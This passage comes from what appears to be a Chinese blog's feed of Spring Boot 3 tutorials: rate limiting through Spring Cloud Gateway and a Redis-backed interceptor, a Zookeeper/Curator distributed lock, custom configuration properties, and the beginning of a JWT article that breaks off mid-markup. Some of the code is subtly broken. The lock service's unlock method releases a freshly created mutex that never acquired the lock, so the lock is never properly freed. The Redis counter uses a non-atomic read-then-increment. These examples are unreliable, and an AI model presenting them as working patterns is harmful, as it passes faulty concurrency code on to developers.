<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">example_route</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">http://localhost:8080</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/api/**</span></span><br><span class="line">        <span class="attr">filters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">RequestRateLimiter</span></span><br><span class="line">          <span class="attr">args:</span></span><br><span class="line">            <span class="attr">keyResolver:</span> <span class="string">&quot;#&#123;@remoteAddrKeyResolver&#125;&quot;</span></span><br><span class="line">            <span class="attr">redis-rate-limiter.replenishRate:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">redis-rate-limiter.burstCapacity:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>这里的predicates定义了请求的匹配条件，当请求路径符合&#x2F;api&#x2F;**时，就会应用后面的过滤器。filters中的RequestRateLimiter就是限流过滤器，keyResolver指定了限流的 key，这里使用的是远程地址作为 key，意味着每个 IP 地址都会单独进行限流统计；replenishRate表示每秒生成的令牌数，也就是允许的平均请求速率；burstCapacity定义了瞬时请求的最大数量，即令牌桶的容量。</p>
<h3 id="编写-KeyResolver"><a href="#编写-KeyResolver" class="headerlink" title="编写 KeyResolver"></a>编写 KeyResolver</h3><p>创建一个KeyResolver的实现类，用于确定限流的 key。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.ratelimit.KeyResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RateLimiterConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> KeyResolver <span class="title function_">remoteAddrKeyResolver</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> exchange -&gt; Mono.just(exchange.getRequest().getRemoteAddress().getAddress().getHostAddress());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就完成了基于 Spring Cloud Gateway 的限流操作配置，它能够有效地对指定路径的请求进行流量控制。</p>
<h2 id="自定义注解结合-Redis-实现限流"><a href="#自定义注解结合-Redis-实现限流" class="headerlink" title="自定义注解结合 Redis 实现限流"></a>自定义注解结合 Redis 实现限流</h2><h3 id="定义自定义注解"><a href="#定义自定义注解" class="headerlink" title="定义自定义注解"></a>定义自定义注解</h3><p>新建一个自定义注解RateLimit，用于标记需要限流的接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> RateLimit &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">limit</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">timeout</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">60</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>limit表示在timeout时间内允许的最大请求次数，timeout表示时间窗口，单位为秒。</p>
<h3 id="编写拦截器"><a href="#编写拦截器" class="headerlink" title="编写拦截器"></a>编写拦截器</h3><p>创建一个拦截器类RateLimitInterceptor，实现HandlerInterceptor接口，在其中进行限流逻辑的处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.method.HandlerMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RateLimitInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Integer&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RateLimitInterceptor</span><span class="params">(RedisTemplate&lt;String, Integer&gt; redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(handler <span class="keyword">instanceof</span> HandlerMethod)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> (HandlerMethod) handler;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> handlerMethod.getMethod();</span><br><span class="line">        <span class="type">RateLimit</span> <span class="variable">rateLimit</span> <span class="operator">=</span> method.getAnnotation(RateLimit.class);</span><br><span class="line">        <span class="keyword">if</span> (rateLimit == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">limit</span> <span class="operator">=</span> rateLimit.limit();</span><br><span class="line">        <span class="type">int</span> <span class="variable">timeout</span> <span class="operator">=</span> rateLimit.timeout();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;rate_limit:&quot;</span> + request.getRequestURI();</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="literal">null</span>) &#123;</span><br><span class="line">            redisTemplate.opsForValue().set(key, <span class="number">1</span>, timeout, TimeUnit.SECONDS);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &lt; limit) &#123;</span><br><span class="line">            redisTemplate.opsForValue().increment(key);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_TOO_MANY_REQUESTS);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在拦截器中，通过判断请求的 URI，在 Redis 中记录请求次数。如果请求次数超过限制，就返回 429 状态码，表示请求过多。</p>
<h3 id="注册拦截器"><a href="#注册拦截器" class="headerlink" title="注册拦截器"></a>注册拦截器</h3><p>在WebMvcConfigurer的实现类中注册拦截器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Integer&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebMvcConfig</span><span class="params">(RedisTemplate&lt;String, Integer&gt; redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">RateLimitInterceptor</span>(redisTemplate))</span><br><span class="line">              .addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这种方式，就实现了自定义注解结合 Redis 的限流操作，能够更加灵活地对不同接口进行限流设置。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3功能三【Zookeeper实现分布式锁】</title>
    <url>/cnblogs.github.io/p/c75a.html</url>
    <content><![CDATA[<h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>首先，在 Spring Boot3 项目的 pom.xml 文件中引入必要的依赖。我们需要 Curator 库，它是对 Zookeeper API 的高层封装，极大简化了 Zookeeper 的使用。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="配置-Zookeeper-连接"><a href="#配置-Zookeeper-连接" class="headerlink" title="配置 Zookeeper 连接"></a>配置 Zookeeper 连接</h3><p>接下来，在 application.properties 文件中配置 Zookeeper 服务器的连接信息，比如：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">zookeeper.connectString=127.0.0.1:2181</span></span><br><span class="line"><span class="string">zookeeper.sessionTimeoutMs=60000</span></span><br><span class="line"><span class="string">zookeeper.connectionTimeoutMs=15000</span></span><br></pre></td></tr></table></figure>
<p>然后，创建一个配置类来初始化 Zookeeper 客户端连接。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.curator.RetryPolicy;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFramework;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFrameworkFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.retry.ExponentialBackoffRetry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZookeeperConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;zookeeper.connectString&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String connectString;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;zookeeper.sessionTimeoutMs&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sessionTimeoutMs;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;zookeeper.connectionTimeoutMs&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> connectionTimeoutMs;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CuratorFramework <span class="title function_">curatorFramework</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RetryPolicy</span> <span class="variable">retryPolicy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExponentialBackoffRetry</span>(<span class="number">1000</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">return</span> CuratorFrameworkFactory.builder()</span><br><span class="line">               .connectString(connectString)</span><br><span class="line">               .sessionTimeoutMs(sessionTimeoutMs)</span><br><span class="line">               .connectionTimeoutMs(connectionTimeoutMs)</span><br><span class="line">               .retryPolicy(retryPolicy)</span><br><span class="line">               .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实现分布式锁"><a href="#实现分布式锁" class="headerlink" title="实现分布式锁"></a>实现分布式锁</h3><p>借助 Curator 的 InterProcessMutex 类来实现分布式可重入排它锁。以下是一个简单的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFramework;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.recipes.locks.InterProcessMutex;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DistributedLockService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CuratorFramework curatorFramework;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_PATH</span> <span class="operator">=</span> <span class="string">&quot;/my_distributed_lock&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeout, TimeUnit unit)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InterProcessMutex</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterProcessMutex</span>(curatorFramework, LOCK_PATH);</span><br><span class="line">        <span class="keyword">return</span> lock.acquire(timeout, unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InterProcessMutex</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterProcessMutex</span>(curatorFramework, LOCK_PATH);</span><br><span class="line">        lock.release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在业务代码中，就可以像这样使用分布式锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DistributedLockService distributedLockService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test-lock&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (distributedLockService.tryLock(<span class="number">5</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 这里是获取到锁后执行的业务逻辑</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;成功获取锁，执行了业务逻辑&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    distributedLockService.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;获取锁失败&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;获取锁时发生异常&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>总结</strong><br>通过以上步骤，我们成功地在 Spring Boot3 项目中整合 Zookeeper 实现了分布式锁机制。在实际项目中，分布式锁的正确使用至关重要，它能有效避免数据不一致等问题，提升系统的稳定性和可靠性。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3功能二【自定义配置文件】</title>
    <url>/cnblogs.github.io/p/9663.html</url>
    <content><![CDATA[<p><strong>在默认配置文件中自定义属性</strong><br>Spring Boot 3 默认会读取 application.properties 或 application.yml 这两个配置文件。其中，application.yml 因其简洁易读的格式，近年来越来越受开发者青睐。我们先来看在 application.ym 中自定义属性的方法。假设我们要定义一组与用户相关的自定义属性，可以这样编写：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">my:</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">自定义用户名</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">email:</span> <span class="string">example@example.com</span></span><br></pre></td></tr></table></figure>
<p>在上述代码中，我们通过层级结构定义了 my.user 下的多个属性。那么，如何在代码中读取这些属性呢？有两种常见方式。</p>
<p><strong>使用@Value注解</strong><br>如果只是简单地读取单个属性值，我们可以在需要使用属性值的变量上添加 @Value(“${属性名}”) 注解。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyComponent</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.user.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String myUserName;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.user.age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> myUserAge;</span><br><span class="line">    <span class="comment">// 相应的 get 和 set 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMyUserName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> myUserName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMyUserName</span><span class="params">(String myUserName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myUserName = myUserName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMyUserAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> myUserAge;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMyUserAge</span><span class="params">(<span class="type">int</span> myUserAge)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myUserAge = myUserAge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，在 MyComponent 类中，我们就成功将配置文件中的属性值注入到了对应的变量中。不过，@Value 注解在处理多个相关属性时，代码可能会显得比较繁琐，此时我们可以采用另一种方式。</p>
<p><strong>使用@ConfigurationProperties注解</strong><br>这种方式更适合将一组相关的配置属性赋值给一个实体类。我们继续以上述 my.user 的配置为例，创建一个对应的实体类 UserConfig：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;my.user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">// 生成对应的 get 和 set 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个类中，我们通过 @ConfigurationProperties(prefix &#x3D; “my.user”) 注解，告诉 Spring Boot 将配置文件中 my.user 前缀下的属性值绑定到这个类的对应属性上。同时，加上 @Component 注解，使 Spring Boot 启动时将该类作为 Bean 注入 IoC 容器。<br>之后，在需要使用这些属性的地方，比如 Controller 类中，我们还需要加上 @EnableConfigurationProperties 注解并指明该 bean 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(UserConfig.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserConfig userConfig;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/userConfig&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Name: &quot;</span> + userConfig.getName() + <span class="string">&quot;, Age: &quot;</span> + userConfig.getAge() + <span class="string">&quot;, Email: &quot;</span> + userConfig.getEmail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，当访问 &#x2F;userConfig 接口时，就能获取到配置文件中自定义的用户属性信息了。这种方式对于管理一组相关的配置属性非常方便，代码结构也更加清晰。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3功能五【JWT实现RESTFul接口认证】</title>
    <url>/cnblogs.github.io/p/597e.html</url>
    <content><![CDATA[<blockquote>
<p>Spring Boot3 与 JWT 整合全流程技术方案</p>
</blockquote>
<h3 id="项目环境搭建与依赖管理"><a href="#项目环境搭建与依赖管理" class="headerlink" title="项目环境搭建与依赖管理"></a>项目环境搭建与依赖管理</h3><p>首先，基于 Spring Initializr 或 IDE 工具创建标准的 Spring Boot3 项目，确保项目基础配置符合开发需求。在构建文件pom.xml中，引入 JJWT 相关依赖，构建 JWT 技术应用的基础环境：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span 